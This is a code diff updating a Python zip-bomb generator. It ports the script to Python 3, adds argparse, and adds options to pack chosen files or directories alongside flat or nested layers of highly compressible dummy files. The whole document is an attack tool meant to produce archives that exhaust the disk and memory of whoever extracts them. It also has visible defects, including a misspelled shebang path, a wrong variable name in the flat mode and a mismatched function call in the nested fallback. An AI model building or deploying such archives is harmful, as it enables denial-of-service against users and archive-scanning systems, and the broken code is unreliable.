@@ -1,3 +1,5 @@
+#!/usb/bin/env python3
+
 import zlib
 import zipfile
 import math
@@ -5,7 +7,7 @@ import os
 import shutil
 import sys
 import time
-
+import argparse
 	
 def generate_dummy_file(filename, size):
 	with open(filename,'w') as dummy:
@@ -14,7 +16,7 @@ def generate_dummy_file(filename, size):
 	
 def make_copies_and_compress(infile, outfile, n_copies):
 	zf = zipfile.ZipFile(outfile, mode='w', allowZip64= True)
-	for i in xrange(n_copies):
+	for i in range(n_copies):
 		extension = infile[infile.rfind('.')+1:]
 		basename = infile[:infile.rfind('.')]
 		f_name = '%s-%d.%s' % (basename,i,extension)
@@ -24,21 +26,44 @@ def make_copies_and_compress(infile, outfile, n_copies):
 	zf.close()
 	
 	
-def make_zip_flat(size, out_file):
+def add_file_to_zip(zf, path, include_dir=True):
+	"""Add directory to zip file"""
+	if os.path.isfile(path):
+		zf.write(path, compress_type=zipfile.ZIP_DEFLATED)
+	elif os.path.isdir(path):
+		for root, dirs, files in os.walk(path):
+			arc_root = root
+			if not include_dir:
+				arc_root = root[len(path):]
+				if arc_root.startswith(os.sep):
+					arc_root = arc_root[1:]
+			for file in files:
+				zf.write(os.path.join(root, file), arcname=os.path.join(arc_root, file))
+				
+	
+def make_zip_flat(size, out_file, include_dirs, include_files):
 	"""
 	Creates flat zip file without nested zips.
 	Zip contains n files each of size size/n and is saved in out_file.
 	"""
 	dummy_name_format = 'dummy{}.txt'
 		
-	files_nb = size / 100
-	file_size = size / files_nb
+	files_nb = int(size / 100)
+	file_size = int(size / files_nb)
 	last_file_size = size - (file_size * files_nb)
 	
 	if os.path.isfile(out_zip_file):
 		os.remove(out_zip_file)
 		
 	zf = zipfile.ZipFile(out_file, mode='w', allowZip64=True)
+	
+	# Include selected dirs
+	for f in include_dirs:
+		add_file_to_zip(zf, f, include_dir=False)
+	for f in include_files:
+		add_file_to_zip(zf, f)
+		
+	# Generate and add dummy big files	
 	if files_nb > 0:
 		for i in range(files_nb):
 			dummy_name = dummy_name_format.format(i)
@@ -48,6 +73,7 @@ def make_zip_flat(size, out_file):
 				os.rename(dummy_name_format.format(i-1), dummy_name)
 			zf.write(dummy_name, compress_type=zipfile.ZIP_DEFLATED)
 		os.remove(dummy_name)
+	
 	
 	if last_file_size > 0:
 		dummy_name = dummy_name_format.format(files_nb)
@@ -73,7 +99,7 @@ def get_files_depth_and_size(total_size):
 		if inc_files_nb**inc_files_nb * file_size < total_size:
 			files_nb = inc_files_nb
 		# file size
-		new_file_size = total_size / (files_nb**files_nb)
+		new_file_size = int(total_size / (files_nb**files_nb))
 		if new_file_size > 2 * file_size:
 			file_size *= 2
 		elif new_file_size == file_size:
@@ -84,26 +110,33 @@ def get_files_depth_and_size(total_size):
 	return files_nb, file_size
 		
 	
-def make_zip_nested(size_MB, out_zip_file):
+def make_zip_nested(size_MB, out_zip_file, include_dirs, include_files):
 	"""
 	Creates nested zip file (zip file of zip files of zip files etc.).
 	"""
 	if size_MB < 500:
-		print 'Warning: too small size, using flat mode.'
+		print('Warning: too small size, using flat mode.')
 		return make_zip_flat(size_MB, out_zip_file)
 	
 	depth, file_size = get_files_depth_and_size(size_MB)
 	actual_size = depth**depth*file_size 
-	print 'Warning: Using nested mode. Actual size may differ from given.'
+	print('Warning: Using nested mode. Actual size may differ from given.')
 	
 	dummy_name = 'dummy.txt'
 	generate_dummy_file(dummy_name, file_size)
 	zf = zipfile.ZipFile('1.zip', mode='w', allowZip64= True)
 	zf.write(dummy_name, compress_type=zipfile.ZIP_DEFLATED)
+	
+	# Include selected dirs
+	for f in include_dirs:
+		add_file_to_zip(zf, f, include_dir=False)
+	for f in include_files:
+		add_file_to_zip(zf, f)
+	
 	zf.close()
 	os.remove(dummy_name)
 	
-	for i in xrange(1,depth+1):
+	for i in range(1,depth+1):
 		make_copies_and_compress('%d.zip'%i,'%d.zip'%(i+1),depth)
 		os.remove('%d.zip'%i)
 	if os.path.isfile(out_zip_file):
@@ -111,38 +144,38 @@ def make_zip_nested(size_MB, out_zip_file):
 	os.rename('%d.zip'%(depth+1),out_zip_file)
 	return actual_size
 	
-def usage():
-	print 'Usage: zip-bomb.py <mode> <size> <out_zip_file>'
-	print 
-	print 'Creates ZIP bomb archive'
-	print
-	print '<mode> - mode of compression'
-	print '  nested - nested zip file (zip file of zip files of ...)'
-	print '  flat   - flat file without nested zips'
-	print '<size> - decompression size in MB'
-	print '<out_zip_file> - path to destination file'
-	exit(1)
+
+def help_epilog():
+	return """mode of compression options:
+  flat - flat zip file with contents
+  nested - nested zip file, zip of zips of zips ... (much smaller) """
 	
 	
 if __name__ == '__main__':
+
+	parser = argparse.ArgumentParser(description='Creates ZIP bomb archive.', 
+				formatter_class=argparse.RawDescriptionHelpFormatter, epilog=help_epilog())
+	parser.add_argument('-d', '--dirs', action='store', 
+		help='add directory contents to ZIP file. multiple directiroes separated with comma', default='')
+	parser.add_argument('-f', '--files', action='store', 
+		help='add files (can be directory) to ZIP file. multiple files separated with comma', default='')
+	parser.add_argument('mode', help='mode of compression. see choices description below', choices=('flat', 'nested'))
+	parser.add_argument('size', help='decompression size in MB', type=int)
+	parser.add_argument('out_zip_file', help='path to destination file')
 	
-	if len(sys.argv) < 4:
-		usage()
+	args = parser.parse_args()
 	
-	mode = sys.argv[1]
-	size_MB = int(sys.argv[2])
-	out_zip_file = sys.argv[3]
+	out_zip_file = args.out_zip_file
 	
-	if mode not in ['nested', 'flat']:
-		usage()
+	include_dirs = [d.strip() for d in args.dirs.strip().split(',') if d is not '']
+	include_files = [d.strip() for d in args.files.strip().split(',') if d is not '']
+	
 	start_time = time.time()
-	if mode == 'flat':
-		actual_size = make_zip_flat(size_MB, out_zip_file)
-	elif mode == 'nested':
-		actual_size = make_zip_nested(size_MB, out_zip_file)
+	if args.mode == 'flat':
+		actual_size = make_zip_flat(args.size, out_zip_file, include_dirs, include_files)
 	else:
-		usage()
+		actual_size = make_zip_nested(args.size, out_zip_file, include_dirs, include_files)
 	end_time = time.time()
-	print 'Compressed File Size: %.2f KB'%(os.stat(out_zip_file).st_size/1024.0)
-	print 'Size After Decompression: %d MB'%actual_size
-	print 'Generation Time: %.2fs'%(end_time - start_time)
+	print('Compressed File Size: %.2f KB'%(os.stat(out_zip_file).st_size/1024.0))
+	print('Size After Decompression: %d MB'%actual_size)
+	print('Generation Time: %.2fs'%(end_time - start_time))
